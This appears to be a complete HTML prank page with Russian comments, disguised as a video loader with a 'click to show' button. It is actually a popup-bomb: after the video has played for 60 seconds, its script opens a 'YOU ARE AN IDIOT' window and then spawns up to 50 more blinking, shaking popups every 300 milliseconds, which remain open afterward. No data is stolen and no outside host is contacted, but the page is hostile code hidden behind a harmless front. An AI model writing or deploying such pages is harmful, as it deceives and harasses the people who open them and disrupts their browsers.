<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        html, body {
            margin: 0; padding: 0; height: 100%;
            background: #000; overflow: hidden;
            font-family: Arial, sans-serif;
        }
        #start-screen {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            background: #000; cursor: pointer; z-index: 9999;
        }
        #start-screen h1 {
            font-size: 22px; color: #fff; margin-bottom: 30px;
        }
        #green-btn {
            background: #00cc44; color: #fff; border: none;
            padding: 18px 40px; font-size: 20px;
            border-radius: 8px; cursor: pointer;
            box-shadow: 0 0 20px rgba(0, 204, 68, 0.6);
        }
        #green-btn:hover { background: #00ff55; }
        #video-container {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 1; display: none; background: #000;
        }
        #fullscreen-video {
            width: 100%; height: 100%; object-fit: cover;
        }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div id="start-screen" onclick="startVideo()">
        <h1>Загрузка контента...</h1>
        <button id="green-btn" onclick="event.stopPropagation(); startVideo();">
            ▶ Нажми, чтобы показать
        </button>
    </div>

    <div id="video-container">
        <video id="fullscreen-video" loop playsinline>
            <source src="video.mp4" type="video/mp4">
        </video>
    </div>

    <script>
        var started = false;
        var spamInterval = null;
        var spamCount = 0;
        var MAX_SPAM = 50;

        function startVideo() {
            if (started) return;
            started = true;

            document.getElementById('start-screen').classList.add('hidden');
            document.getElementById('video-container').style.display = 'block';

            var video = document.getElementById('fullscreen-video');
            video.play().catch(function(e) {
                console.log('Ошибка автоплея:', e);
            });

            // Через 60 секунд — начинается хаос
            setTimeout(startChaos, 60000);
        }

        function startChaos() {
            // Открываем первое окно с вирусом
            var w = window.open('', '_blank', 'width=600,height=500');
            if (w) {
                w.document.write(`
                    <html>
                    <head><title>YOU ARE AN IDIOT</title></head>
                    <body style="background:black;color:red;font-family:monospace;
                                 text-align:center;padding-top:50px;overflow:hidden;">
                        <h1 style="font-size:60px;animation:blink 0.4s infinite;">
                            YOU ARE AN IDIOT
                        </h1>
                        <h2 style="font-size:30px;">SURVIVAL FOR THE FITTEST</h2>
                        <button onclick="stopAll()" style="font-size:20px;
                                padding:15px 30px;margin-top:30px;
                                background:red;color:white;border:none;
                                cursor:pointer;">STOP EVERYTHING</button>
                        <style>
                            @keyframes blink {
                                0% { color: red; }
                                50% { color: black; }
                                100% { color: red; }
                            }
                            body { animation: shake 0.1s infinite; }
                            @keyframes shake {
                                0% { transform: translate(0,0); }
                                25% { transform: translate(2px,2px); }
                                50% { transform: translate(-2px,-2px); }
                                75% { transform: translate(2px,-2px); }
                                100% { transform: translate(0,0); }
                            }
                        </style>
                        <script>
                            function stopAll() {
                                try { opener.stopSpam(); } catch(e) {}
                                window.close();
                            }
                        <\/script>
                    </body>
                    </html>
                `);
            }

            // Спамим дополнительными окнами каждые 300мс
            spamInterval = setInterval(function() {
                if (spamCount >= MAX_SPAM) {
                    clearInterval(spamInterval);
                    return;
                }
                spamCount++;
                try {
                    var w2 = window.open('', '_blank', 'width=400,height=350');
                    if (w2) {
                        w2.document.write(`
                            <html>
                            <head><title>YOU ARE AN IDIOT</title></head>
                            <body style="background:black;color:red;
                                         font-family:monospace;text-align:center;
                                         padding-top:40px;">
                                <h1 style="font-size:40px;
                                           animation:blink 0.3s infinite;">
                                    YOU ARE AN IDIOT
                                </h1>
                                <p style="font-size:18px;">#` + spamCount + `</p>
                                <button onclick="window.close()"
                                        style="font-size:16px;padding:10px 20px;
                                        background:red;color:white;border:none;
                                        cursor:pointer;margin-top:20px;">
                                    CLOSE ME
                                </button>
                                <style>
                                    @keyframes blink {
                                        0% { color: red; }
                                        50% { color: black; }
                                        100% { color: red; }
                                    }
                                </style>
                            </body>
                            </html>
                        `);
                    }
                } catch(e) {}
            }, 300);

            // Через 20 секунд остановить спам (но окна останутся)
            setTimeout(function() {
                if (spamInterval) clearInterval(spamInterval);
            }, 20000);
        }

        function stopSpam() {
            if (spamInterval) {
                clearInterval(spamInterval);
                spamInterval = null;
            }
        }
    </script>
</body>
</html>
